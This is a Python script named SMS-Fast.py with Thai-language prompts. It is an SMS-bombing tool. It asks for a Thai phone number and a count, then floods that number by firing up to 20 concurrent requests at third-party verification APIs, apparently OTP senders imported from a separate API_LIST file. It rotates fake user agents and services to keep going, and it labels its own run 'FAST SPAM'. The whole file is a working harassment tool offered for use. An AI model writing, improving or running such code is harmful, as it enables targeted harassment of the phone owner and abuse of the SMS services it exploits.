# program/SMS-Fast.py
import asyncio
import aiohttp
import random
import time
from fake_useragent import UserAgent
from API_LIST import API_CONFIG

# --- 🎨 ส่วนสี ---
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    C_GREEN = Fore.GREEN + Style.BRIGHT
    C_RED = Fore.RED + Style.BRIGHT
    C_YELLOW = Fore.YELLOW + Style.BRIGHT
    C_CYAN = Fore.CYAN + Style.BRIGHT
    C_RESET = Style.RESET_ALL
except ImportError:
    C_GREEN = C_RED = C_YELLOW = C_CYAN = C_RESET = ""
# -----------------

ua = UserAgent()
api_status = {k: {"active": True, "cooldown": 0} for k in API_CONFIG}
success_count = 0

async def send_request(session, api_key, phone, sem):
    async with sem:
        if not api_status[api_key]["active"] or time.time() < api_status[api_key]["cooldown"]:
            return False
        cfg = API_CONFIG[api_key]
        url = cfg["url"].format(phone=phone) if "{phone}" in cfg["url"] else cfg["url"]
        headers = cfg["headers"]()
        data_input = cfg["data"](phone) if cfg["data"] else None
        
        try:
            kwargs = {"headers": headers, "timeout": 10}
            if isinstance(data_input, dict): kwargs["json"] = data_input
            elif isinstance(data_input, str): kwargs["data"] = data_input

            async with session.request(cfg["method"], url, **kwargs) as resp:
                if resp.status in (200, 201):
                    text = await resp.text()
                    if cfg["success_check"](text):
                        global success_count
                        success_count += 1
                        # ✅ สีเขียว
                        print(f"{C_GREEN}ส่ง SMS สำเร็จครั้งที่ {success_count} | เบอร์ {phone} | API: {cfg['name']}{C_RESET}")
                        return True
        except Exception:
            api_status[api_key]["active"] = False
            api_status[api_key]["cooldown"] = time.time() + 10
        return False

async def send_sms(phone, target_successes):
    phone = "".join(filter(str.isdigit, phone.strip()))
    if phone.startswith("66"): phone = "0" + phone[2:]
    elif phone.startswith("+66"): phone = "0" + phone[3:]
    
    if len(phone) != 10:
        print(f"{C_RED}เบอร์ไม่ถูกต้อง (ต้องมี 10 หลัก){C_RESET}")
        return

    print(f"{C_CYAN}⚡ เริ่มโหมด FAST SPAM ไปที่: {phone}{C_RESET}")
    start_time = time.time()
    timeout = 600
    sem = asyncio.Semaphore(20)

    async with aiohttp.ClientSession() as session:
        while success_count < target_successes and time.time() - start_time < timeout:
            active_apis = [k for k, v in api_status.items() if v["active"] and time.time() >= v["cooldown"]]
            
            if not active_apis:
                print(f"{C_YELLOW}ไม่มี API ที่ใช้งานได้ รอ 3 วินาที...{C_RESET}")
                for k in api_status:
                    if time.time() > api_status[k]["cooldown"]:
                         api_status[k]["active"] = True
                await asyncio.sleep(3)
                continue

            tasks = []
            for _ in range(min(20, len(active_apis))):
                api_key = random.choice(active_apis)
                tasks.append(send_request(session, api_key, phone, sem))
                await asyncio.sleep(random.uniform(0.01, 0.05))
            
            await asyncio.gather(*tasks)

    print(f"{C_CYAN}ส่ง SMS เสร็จสิ้น | สำเร็จ {success_count}/{target_successes} ครั้ง ✅{C_RESET}")

if __name__ == "__main__":
    try:
        phone = input(f"{C_YELLOW}กรุณาใส่เบอร์โทรศัพท์: {C_RESET}")
        target = int(input(f"{C_YELLOW}กรุณาใส่จำนวนครั้งที่ต้องการส่ง SMS: {C_RESET}"))
        asyncio.run(send_sms(phone, target))
    except ValueError:
        print(f"{C_RED}จำนวนครั้งต้องเป็นตัวเลขจำนวนเต็ม{C_RESET}")
